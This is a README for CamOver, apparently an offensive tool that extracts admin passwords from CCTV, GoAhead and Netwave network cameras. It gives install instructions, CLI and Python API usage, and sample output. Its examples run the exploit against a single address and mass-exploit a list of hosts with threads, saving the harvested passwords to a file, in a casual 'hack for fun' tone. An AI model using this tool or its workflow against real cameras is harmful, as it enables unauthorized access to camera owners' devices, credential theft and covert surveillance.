# CamOver

 CamOver is a camera exploitation tool that allows to disclosure network camera admin password.

## Features

* Exploits vulnerabilities in most popular camera models such as `CCTV`, `GoAhead` and `Netwave`.
* Optimized to exploit multiple cameras at one time from list with threading enabled.
* Simple CLI and API usage.

## Installation

```shell
pip3 install git+https://github.com/EntySec/CamOver
```

## Basic usage

To use CamOver just type `camover` in your terminal.

```
usage: camover [-h] [--threads] [--output OUTPUT] [--input INPUT]
               [--address ADDRESS]

CamOver is a camera exploitation tool that allows to disclosure network camera
admin password.

optional arguments:
  -h, --help         show this help message and exit
  --threads          Use threads for fastest work.
  --output OUTPUT    Output result to file.
  --input INPUT      Input file of addresses.
  --address ADDRESS  Single address.
```

### Examples

Let's hack my camera just for fun.

```shell
camover --address 192.168.99.100
```

**output:**

```shell
[*] (192.168.99.100) - connecting to device...
[*] (192.168.99.100) - accessing device rom...
[*] (192.168.99.100) - extracting admin password...
[i] (192.168.99.100) - password: mamahacker123
```

Let's try to use opened database of hosts with `--threads` for fast exploitation.

```shell
camover --threads --input cameras.txt --output passwords.txt
```

It will exploit all cameras in `cameras.txt` list by their addresses and save all obtained passwords to `passwords.txt`.

**output:**

```shell
[*] Initializing thread #0...
[*] (x.x.x.x) - connecting to camera...
[*] Initializing thread #1...
[*] (x.x.x.x) - connecting to camera...
[*] Initializing thread #2...
[*] (x.x.x.x) - connecting to camera...
[*] (x.x.x.x) - accessing camera config...
[*] (x.x.x.x) - extracting admin password...
[i] Thread #0 completed.
[*] (x.x.x.x) - connecting to camera...
[*] (x.x.x.x) - accessing camera config...
[*] (x.x.x.x) - extracting admin password...
[i] Thread #1 completed.
[*] (x.x.x.x) - connecting to camera...
[*] (x.x.x.x) - accessing camera config...
[*] (x.x.x.x) - extracting admin password...
[i] Thread #2 completed.
```

## CamOver API

CamOver also has their own Python API that can be invoked by importing CamOver to your code:

```python
from camover import CamOver
```

### Basic functions

There are all CamOver basic functions that can be used to exploit specified device.

* `connect(host)` - Connect specified defice by netword address.
* `exploit(device)` - Exploit connected device.

### Examples

```python
from camover import CamOver

camover = CamOver()

camera = camover.connect('192.168.99.100')
print(camover.exploit(camera))
```

**output:**

```shell
'mamahacker123'
```
